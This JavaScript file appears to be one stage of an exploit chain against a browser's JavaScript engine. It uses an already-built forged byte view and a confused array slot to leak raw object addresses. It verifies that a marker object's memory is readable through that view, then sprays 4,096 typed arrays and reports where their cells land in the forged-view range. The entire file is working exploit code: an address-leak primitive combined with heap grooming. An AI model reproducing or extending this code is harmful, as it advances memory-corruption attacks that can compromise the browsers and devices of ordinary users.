// Root 4,096 ordinary typed arrays and measure whether their JS cells move
// into the calibrated forged-view range. No native-field write.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || !state.calibratedViewBase ||
      state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_anchor_preflight_failed");
  var view = state.view;
  function matches(at, value) {
    return view[at] === (value & 255) &&
      view[at + 1] === (value >>> 8 & 255) &&
      view[at + 2] === (value >>> 16 & 255) &&
      view[at + 3] === (value >>> 24 & 255);
  }
  function wordOf(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var b = 0; b < 8; b++) bytes.push(view[state.index + b]);
    } finally {
      state.array[0] = state.a;
    }
    var out = "0x";
    for (var h = 7; h >= 0; h--)
      out += bytes[h].toString(16).padStart(2, "0");
    return out;
  }
  var base = state.calibratedViewBase;
  var anchorIndex = Number(wordOf(state.addressAnchor)) + 8 - base;
  if (!Number.isSafeInteger(anchorIndex) || anchorIndex < 0 ||
      anchorIndex + 3 >= 2097152 ||
      !matches(anchorIndex, 0x11223344))
    throw new Error("cached_anchor_gate_failed");
  var live = false;
  try {
    state.addressAnchor.marker = 0x55667788;
    live = matches(anchorIndex, 0x55667788);
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (!live || !matches(anchorIndex, 0x11223344))
    throw new Error("cached_anchor_not_live");
  phase = "allocate";
  var pool = [];
  for (var n = 0; n < 4096; n++) {
    var typed = new Uint8Array(1);
    typed[0] = n & 255;
    pool.push(typed);
  }
  state.typedSpray = pool;
  var firstWord = wordOf(pool[0]);
  var middleWord = wordOf(pool[2047]);
  var lastWord = wordOf(pool[4095]);
  result = { id: "typed_cell_spray", status: "pass", details: {
    base: "0x" + base.toString(16), count: pool.length,
    first_word: firstWord, first_index: Number(firstWord) - base,
    middle_word: middleWord, middle_index: Number(middleWord) - base,
    last_word: lastWord, last_index: Number(lastWord) - base,
    array_restored: state.array[0] === state.a
  } };
} catch (error) {
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "typed_cell_spray", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
